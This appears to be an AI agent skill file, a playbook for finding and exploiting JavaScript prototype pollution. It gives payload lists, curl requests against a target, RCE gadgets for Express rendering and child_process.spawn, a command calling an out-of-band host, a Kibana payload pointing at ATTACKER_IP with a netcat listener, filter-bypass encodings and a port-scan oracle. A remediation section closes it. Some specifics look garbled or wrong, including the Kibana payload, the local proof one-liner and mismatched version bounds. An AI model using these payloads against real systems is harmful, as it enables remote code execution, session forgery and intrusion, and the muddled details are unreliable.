---
name: prototype-pollution
description: Detect and exploit JavaScript prototype pollution (server-side merge sinks, client-side DOM gadgets, RCE/auth-bypass gadget chains) with payloads, bypasses, automation, and remediation.
---

# Prototype Pollution

JavaScript prototype pollution (PP) occurs when an attacker-controlled property name/path such as `__proto__`, `constructor.prototype`, or `prototype` reaches a recursive merge/clone/set-defaults primitive, letting them write to `Object.prototype` (or `Function.prototype`). Every object inheriting from those roots silently acquires attacker keys — turning a low-severity "weird JSON key" bug into arbitrary behavior change, auth bypass, template RCE, or client-side XSS. This skill covers detection oracles, gadget hunting, server/client exploitation, parser bypasses, and defense.

## When to use this skill

- Node.js/Express apps, Electron apps, or webpack-bundled SPAs that parse attacker JSON into deep-merge sinks.
- Auditing dependencies: lodash `_.merge`/`_.mergeWith`/`_.defaultsDeep`/`_.set`, `hoek` (`@hapi/hoek`), `deep-extend`, `merge-objects`, `merge`, `just-extend`, `merge-options`, `node.extend`, `y18n`, `sentry-javascript`, `js-yaml<4` (schema DEFAULT_FULL).
- Multi-tenant API surfaces where body/query/qs params flow into config objects (session options, render options, spawn options).
- Exploiting known CVEs: Kibana CVE-2019-7609, jQuery `$.extend` CVE-2019-11358 (Canonical uXSS), lodash CVE-2019-10744/CVE-2020-8203.
- Hardening code reviews: deciding whether a merge call is reachable from user input and what gadget it enables.

## Methodology

### 1. Identify candidate sources and sinks

Grep the target (or `node_modules`) for merge primitives and for where request data lands:

```bash
# Server-side sink hunt
grep -rnE "\.(merge|defaultsDeep|set|extend|deepExtend|update)\(" app/ --include="*.js" | head -50
grep -rnE "require\(['\"](lodash|hoek|@hapi/hoek|deep-extend|merge-objects|merge|just-extend|merge-options|node.extend|y18n)['\"]\)" package.json node_modules -l

# Known vulnerable version pins
npm ls lodash hoek @hapi/hoek deep-extend merge merge-objects just-extend merge-options y18n node.extend sentry-javascript js-yaml
```

Vulnerable baseline versions to flag: `lodash < 4.17.12` (merge/defaultsDeep/set), `deep-extend < 0.5.1`, `hoek < 4.2.1` / `@hapi/hoek < 8.1.1`, `merge-objects <= 1.0.0`, `y18n < 4.0.1` (read-file RCE via polluting `y18n._writeStore`), `node.extend < 1.1.7`, `sentry-javascript < 5.15.4`, `just-extend`/`merge-options`/`merge` (unsafe key copy unless they blacklist `__proto__`).

### 2. Detection payloads — server side

Send one JSON key shape per sink class across body (JSON + form), query (`?a[__proto__][x]=y`), and qs/route params:

```json
{"__proto__":{"injected":true}}
{"__proto__":{"injected":true,"json spaces":10}}
{"constructor":{"prototype":{"injected":true}}}
{"constructor":{"prototype":{"toString":{"foo":1}}}}
["__proto__",{"injected":true}]
{"__proto__":{"__proto__":{"polluted":1}}}
{"__proto__":[],"__proto__":{"injected":true}}
{"__proto__":{"admin":true},"role":"admin"}
```

Non-JSON surface equivalents (qs `extended: true` recursion is a classic sink):

```
?__proto__[injected]=true
?constructor[prototype][injected]=true
?a[__proto__][__proto__][polluted]=1
POST x-www-form-urlencoded:  __proto__[injected]=true&constructor[prototype][injected]=true
```

Confirm via a behavior-change oracle — pollute a key the app actually reads later, e.g. break JSON output spacing or flip a default flag:

```bash
curl -s 'https://target/api/user' -H 'Content-Type: application/json' \
  -d '{"__proto__":{"json spaces":10}}'
curl -s 'https://target/api/user'   # if pretty-printed 10-space JSON now -> polluted
```

Useful oracle keys: `{"status":510}` + `{"body":"pwn"}` on `res.json`-style handlers, `{"shell":"/bin/sh"}`/`{"input":"id"}`/`{"env":{"NODE_OPTIONS":"--require=/proc/self/environ"}}` on `child_process`, `{"client":true,"view":"./views/x.ejs"}` for `res.render`.

### 3. Detection payloads — client side (DOM PP)

In DevTools console on the target origin:

```js
// Source hunt: hook the write path before browsing
const orig = Object.defineProperty;
Object.defineProperty(Object.prototype, '__proto__', {
  get(){ return Object.getPrototypeOf(this); },
  set(v){ console.trace('PP write attempt'); Object.setPrototypeOf(this, v); }
});
// Gadget hunt: watch for reads of polluted keys
Object.defineProperty(Object.prototype, 'config', { set(v){ console.trace('read of Object.prototype.config'); }, get(){ return {src:'//evil/x.js'}; } });
// Simulate and observe
let o = {}; o.constructor.prototype.injected = true;   // pollutes Object.prototype
document.cookie.split(';').map(c=>c.trim());           // watch app behavior change
for (let k in {}) console.log(k);                      // 'injected' leaks everywhere
```

Client-side PP → XSS chains usually need one DOM gadget that interpolates an inherited prop into an HTML sink (`innerHTML`/`src`/`href`), e.g. webpack-style `window.__webpackScriptLoaded` / `script.src = options.url` gadgets, or a template config `{ template: '<img src=x onerror=...>' }`. jQuery `$.extend(deep, target, ...)` pre-3.4 (CVE-2019-11358) pollutes `Object.prototype` from `Object.entries`-ish input and Canonical shipped the uXSS fix in 3.4.

### 4. Escalation gadgets — server side RCE / auth

Express `res.render` render-options gadget (pollute then hit any route that renders without full options):

```bash
curl -s 'https://target/' -d '{"constructor":{"prototype":{"client":true,"view":"./views/"}}}';
# options.client=true + attacker-chosen view filename => compile own template => RCE (EJS/Pug)
```

`child_process.spawn` options gadget (when options object is built from defaults):

```json
{"constructor":{"prototype":{"shell":true,"input":"id; curl http://oob/$(...)",
 "env":{"NODE_OPTIONS":"--require=/proc/self/environ"},
 "NODE_OPTIONS":"--require=/proc/self/environ"}}
}
```

`/proc/self/environ` as the `--require` target smuggles the injected env (with your JS) as a CJS module. Template engines: EJS `outputFunctionName`/`escapeFunction`, Pug `self`/`compileDebug`/`filename`, Handlebars `escapeExpression` — pollute whichever option the sink interpolates into generated code.

Other high-value gadgets: Express `res.cookie` (`{"constructor":{"prototype":{"cookie":{"secure":false,"httpOnly":false,"sameSite":"none"}}}}`) to weaken cookies; `express-session` options pollution to disable signing or force a fixed cookie name; `cookie-signature` `{"seperator":"."}`/secret default pollution to forge unsigned cookies; `Date.prototype` timezone trick (`{"constructor":{"prototype":{"toString":{}},"timezone":"Etc/GMT+13"}}` style) to bypass JWT/session expiry windows (`exp` comparisons).

### 5. Known CVE playbook — Kibana CVE-2019-7609

Timelion visualization input (`?cells=...` / timelion expression in dashboard JSON) reaches `es().msearch()` in < 6.6.1/7.1.0:

```
.es(*).props(label.__proto__.hole="guard").props(label.__proto__.port=4444)
.props(label.__proto__.host="ATTACKER_IP").props(label.__proto__.col=true)
```

Then trigger via Canvas/visualization render; if the canvas is not reachable, pivot by polluting the timelion canvas config. Pair with a listener: `nc -lvnp 4444`. This is the canonical "PP in an internal Node service → Node RCE" demonstration.

### 6. Parser / filter bypasses

- `JSON.parse` itself never writes `__proto__` onto `Object.prototype` (it creates own props) — the *sink* does the damage; blocking at parse is useless against `constructor.prototype`.
- Key-blocklist on `__proto__`? Use nested `{"constructor":{"prototype":{...}}}`.
- Regex literal checks: unicode-escape keys `\u005f\u005fproto__`, `\u005f\u005f\u0070roto__`; also `[__proto__]` array-wrapped forms, `__proto__` with surrogate pairs (`\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f`).
- Non-JSON parsers (Python `json`, Ruby `JSON`, some `qs` forks) happily round-trip `__proto__` keys into merge APIs — test cross-language stacks.
- `Object.create(null)` objects survive pollution but their *merger* may still be vulnerable; test both `.merge` and `.set`/`unset` styles.

### 7. Automation and verification harness

Verify the gadget in a local Node REPL before claiming it, then probe the target's local network via the PP port-scan oracle:

```bash
# 1) Local gadget proof
node -e "const {spawn}=require('child_process'); let opts={};
({constructor:{prototype:opts}})['x']=[].concat([[ 'sh','-c','id' ]]);
Object.prototype.shell='/bin/sh'; Object.prototype.NODE_OPTIONS='--require=/proc/self/environ';
const cp=spawn('x',['-c','id'],{});
cp.stdout.pipe(process.stdout)"

# 2) In-app port oracle: pollute a fetch/axios URL prefix, observe timing/diffs
for p in 3000 5601 9200 6379 5432; do curl -s "https://target/render?__proto__[url]=http://127.0.0.1:$p/" -o /dev/null -w "$p %{time_total}\n"; done
# nmap the same range for correlation once you have any foothold
nmap -sV -p 3000,5601,9200,6379,5432 127.0.0.1
```

CI fuzzing harness idea: replay every discovered sink endpoint with the §2 payload matrix, diff a canary response (e.g. `GET /version` pretty-printing, a header, or error string) before/after.

## Verification & Deliverables

**PoC.** Deliver a minimal chain: (a) pollution request (exact method/path/body), (b) evidence artifact (diffed response showing oracle change, screenshot of `console.log(Object.prototype.injected)` or `"injected" in {}` === true, or reverse-shell listener log), (c) sink attribution — file:line of the merge/extend call and the polluted key path, (d) gadget name (e.g. `res.render client+view`, `spawn NODE_OPTIONS`, `res.cookie`, timelion).

**Impact.** Rank by gadget: template-option pollution → unauthenticated RCE on Node services (Kibana-class); `cookie`/`session` pollution → auth bypass or session forgery; `Date.prototype` → expiry-window bypass; client-side DOM PP → stored/reflected XSS, uXSS (CVE-2019-11358), credential exfil; always note CVSS-relevant reachability (pre-auth? tenant-crossing?).

**Remediation.** (1) Reject keys `__proto__`/`constructor`/`prototype` at every schema boundary (Joi/zod/AJV `additionalProperties:false`, strip with `Object.keys` filter before merge). (2) Freeze roots early in the process: `Object.freeze(Object.prototype); Object.freeze(Object.prototype.__proto__ ?? null); Object.freeze(Array.prototype); Object.freeze(String.prototype);` — note frozen arrays break `.sort`/`.map` internals in old engines; test. (3) Use `Object.create(null)` dictionaries or `Map`/`Set` for all attacker-keyed stores. (4) Upgrade: lodash ≥ 4.17.20, deep-extend ≥ 0.5.1, hoek/@hapi/hoek ≥ 8.1.1/4.2.1, y18n ≥ 4.0.1, node.extend ≥ 1.1.7, sentry-javascript ≥ 5.15.4, js-yaml ≥ 4.x (`DEFAULT_SCHEMA`). (5) Prefer `structuredClone` (or `JSON.parse(JSON.stringify)`) over hand-rolled deep merges; pass explicit non-inherited option objects (`{__proto__:null}`) into `spawn`, `res.render`, session config. (6) Node ≥ 12.x hardens `JSON.parse`/`spawn` paths; Express 5 rejects `__proto__` keys in `res.render`/`res.cookie` option merging — flag any app pinned to Express 4 for that specific gadget family. (7) Add `npx is-website-vulnerable` / `npm audit --omit=dev` to CI plus a unit test asserting `({}).injected === undefined` after every request-fixture replay.
